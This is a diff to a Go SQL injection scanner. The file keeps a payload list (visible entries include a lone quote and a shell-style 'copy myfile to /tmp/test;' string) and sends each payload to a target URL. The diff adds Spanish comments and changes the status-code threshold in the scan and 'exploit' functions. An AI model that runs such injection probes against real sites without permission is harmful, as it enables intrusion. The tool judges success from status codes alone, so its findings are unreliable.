@@ -5,6 +5,7 @@ import (
 	"net/http"
 )
 
+// Lista de payloads
 var plds = []string{
 	// Lista de payloads
 	"'",
@@ -169,6 +170,7 @@ var plds = []string{
 	"copy myfile to /tmp/test;",
 }
 
+// ScanURLForSQLInjection revisa si una URL tiene vulnerabilidades SQL
 func ScanURLForSQLInjection(url string) bool {
 	for _, payload := range plds {
 		testURL := fmt.Sprintf("%s?param=%s", url, payload)
@@ -179,15 +181,18 @@ func ScanURLForSQLInjection(url string) bool {
 		}
 		defer resp.Body.Close()
 
+		// Mostrar solo el código de estado
 		fmt.Printf("Payload: %s - Status: %d\n", payload, resp.StatusCode)
 
-		if resp.StatusCode >= 400 {
+		// Cambiar el umbral para detectar vulnerabilidades SQL
+		if resp.StatusCode >= 400 && resp.StatusCode != 404 {
 			return true
 		}
 	}
 	return false
 }
 
+// ExploitSQLInjection intenta explotar vulnerabilidades SQL en una URL
 func ExploitSQLInjection(url string) bool {
 	for _, pld := range plds {
 		testURL := fmt.Sprintf("%s?param=%s", url, pld)
@@ -197,9 +202,11 @@ func ExploitSQLInjection(url string) bool {
 		}
 		defer resp.Body.Close()
 
+		// Mostrar solo el código de estado
 		fmt.Printf("Payload: %s - Status: %d\n", pld, resp.StatusCode)
 
-		if resp.StatusCode >= 400 {
+		// Cambiar el umbral para detectar explotación exitosa
+		if resp.StatusCode >= 400 && resp.StatusCode != 404 {
 			return true
 		}
 	}
